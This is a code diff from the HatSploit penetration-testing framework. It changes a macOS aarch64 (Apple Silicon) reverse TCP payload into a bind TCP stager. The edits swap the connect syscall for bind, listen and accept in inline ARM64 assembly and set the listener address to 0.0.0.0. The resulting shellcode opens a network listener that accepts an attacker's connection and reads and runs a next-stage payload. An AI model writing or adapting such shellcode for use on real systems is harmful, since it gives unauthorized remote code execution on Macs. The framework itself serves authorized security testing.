@@ -9,23 +9,23 @@ from hatsploit.lib.core.payload.basic import *
 class HatSploitPayload(Payload, Handler):
     def __init__(self):
         super().__init__({
-            'Name': "macOS aarch64 Reverse TCP",
-            'Payload': "macos/aarch64/reverse_tcp",
+            'Name': "macOS aarch64 Bind TCP",
+            'Payload': "macos/aarch64/bind_tcp",
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
             'Description': (
-                "This payload creates an interactive reverse TCP connection for macOS "
-                "with aarch64 (M1, M2, M3, etc.) architecture and reads next phase."
+                "This payload creates an interactive bind TCP connection for macOS "
+                "with aarch64 (M1, M2, M3, etc.) architecture and reads next stage."
             ),
             'Arch': ARCH_AARCH64,
             'Platform': OS_MACOS,
-            'Type': REVERSE_TCP,
+            'Type': BIND_TCP,
         })
 
-        self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
+        self.reliable = BooleanOption('StageReliable', 'no', "Add error checks to payload.",
                                       False, advanced=True)
-        self.length = IntegerOption('PhaseLength', None, "Length of next phase (empty to read length).",
+        self.length = IntegerOption('StageLength', None, "Length of next stage (empty to read length).",
                                     False, advanced=True)
 
     def run(self):
@@ -40,8 +40,21 @@ class HatSploitPayload(Payload, Handler):
             mov x12, x0
             adr x1, addr
             mov x2, 16
-            mov x16, 0x62
+            mov x16, 0x68
             svc 0
+
+            mov x0, x12
+            mov x1, 2
+            mov x16, 0x6a
+            svc 0
+
+            mov x0, x12
+            eor x1, x1, x1
+            eor x2, x2, x2
+            mov x16, 0x1e
+            svc 0
+
+            mov x12, x0
         """
 
         if self.length.value:
@@ -113,7 +126,7 @@ class HatSploitPayload(Payload, Handler):
         addr:
             .short 0x2
             .short 0x{self.rport.little.hex()}
-            .word 0x{self.rhost.little.hex()}
+            .word 0x0
         """
 
-        return self.assemble(assembly)
+        return self.__asm__(assembly)
